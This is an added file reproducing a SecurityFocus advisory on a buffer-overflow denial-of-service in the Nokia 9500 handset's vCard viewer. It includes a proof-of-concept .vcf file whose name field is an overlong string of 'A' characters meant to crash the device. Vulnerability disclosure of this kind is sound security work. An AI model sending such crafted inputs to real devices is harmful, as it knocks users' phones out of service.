@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/13784/info
+
+Nokia 9500 handset vCard viewer is affected by a remote denial of service vulnerability.
+
+This issue presents itself when the device handles a malformed vCard and fails to perform boundary checks prior to copying user-supplied data into a finite sized buffer.
+
+Successful exploitation of this issue requires user interaction as a user is asked to accept the vCard followed by manually opening it. 
+
+The following proof of concept vCard is available:
+--- Nokia9500.vcf ---
+BEGIN:VCARD
+VERSION:2.1
+N:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;BIALOGLOWY
+FN:Marek Bialoglowy
+ORG:INDEPENDENT
+TITLE:COO
+TEL;WORK;VOICE:+6221
+TEL;WORK;FAX;
+ADR;WORK;ENCODING=QUOTED-PRINTABLE:;;Indonesia
+LABEL;WORK;ENCODING=QUOTED-PRINTABLE:Indonesia
+URL;WORK;
+EMAIL;PREF;INTERNET:bialoglowy@gmail.com
+REV:20050430T1958490
+END:VCARD
+--- Nokia9500.vcf --- 
